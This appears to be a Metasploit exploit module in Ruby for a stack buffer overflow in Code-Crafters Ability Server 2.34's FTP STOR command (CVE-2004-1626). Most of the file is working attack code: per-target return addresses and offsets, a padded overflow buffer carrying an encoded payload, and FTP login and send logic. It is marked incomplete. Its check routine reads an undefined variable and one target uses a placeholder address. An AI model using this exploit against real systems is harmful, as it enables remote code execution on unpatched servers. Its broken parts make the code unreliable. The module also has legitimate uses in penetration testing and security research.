##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = NormalRanking

	include Msf::Exploit::Remote::Ftp

	def initialize(info = {})
		super(update_info(info,
			'Name'           => '[INCOMPLETE] Code-Crafters Ability Server = 2.34 STOR Command Buffer Overflow',
			'Description'    => %q{
					This module exploits a stack-based buffer overflow in Ability Server 2.34.
				Ability Server fails to check input size when parsing 'STOR' and 'APPE' commands,
				which leads to a stack based buffer overflow. This plugin uses the 'STOR' command.

				The vulnerability has been confirmed on version 2.34 and has also been reported
				in version 2.25 and 2.32. Other versions may also be affected.
			},
			'Author'         =>
				[
					'muts',        #Initial discovery
					'Dark Eagle',  #same as muts
					'Ekelow',      #Metasploit
				],
			'License'        => MSF_LICENSE,
			'References'     =>
				[
					[ 'CVE', '2004-1626' ],
					[ 'URL', 'http://www.exploit-db.com/exploits/588/' ]
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process'
				},
			'Privileged'     => false,
			'Payload'        =>
				{
					'Space'    => 1000,
					'BadChars' => "\x00\xff"
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[
						'Windows 2000 SP4',
						{
							'Ret' => 0x7C2FA0F7,
							'Offset' => 966
						}
					],
					[
						'Windows XP SP2',
						{
							'Ret'  => 0x7D17D737,
							'Offset' => 970
						}
					],
					[
						'Windows XP SP3',
						{
							'Ret' => 0x7e429353,  #JMP ESP in USER32.dll
							#'Offset' => 966
							'Offset' => 971
						}
					],
					[
						'Windows Server 2003 SP0',
						{
							'Ret' => 0x41414141,
							'Offset' => 966
						}
					]
				],
			'DisclosureDate' => 'Oct 22 2004'
		))

		register_options(
			[
				Opt::RPORT(21),
				OptString.new('FTPUSER', [ true, 'Valid FTP username', 'ftp' ]),
				OptString.new('FTPPASS', [ true, 'Valid FTP password for username', 'ftp' ])
			], self.class)
	end

	def check
		connect
		banner = sock.get_once(-1,3)
		disconnect
		if res =~ /Ability Server 2\.34/
			return Exploit::CheckCode::Vulnerable
		else
			if res =~ /Ability Server/
				return Exploit::CheckCode::Detected
			end
		end
		return Exploit::CheckCode::Safe
	end

	def exploit
		#sploit = rand_text(target['Offset'])
		sploit = "A"*(target['Offset'])
		sploit << [target.ret].pack('V')
		#sploit << make_nops(32)
		sploit << "\x90"
		sploit << payload.encoded
		sploit << "B"*(sploit.length)
		#sploit << rand_text_alpha(sploit.length)

		connect_login
		send_cmd( ['STOR', sploit], false)
		handler
		disconnect
	end
end

=begin
This module isn't ready because it needs to account for the client's IP + username to calculate the offset correctly:
http://dev.metasploit.com/redmine/projects/framework/activity
=end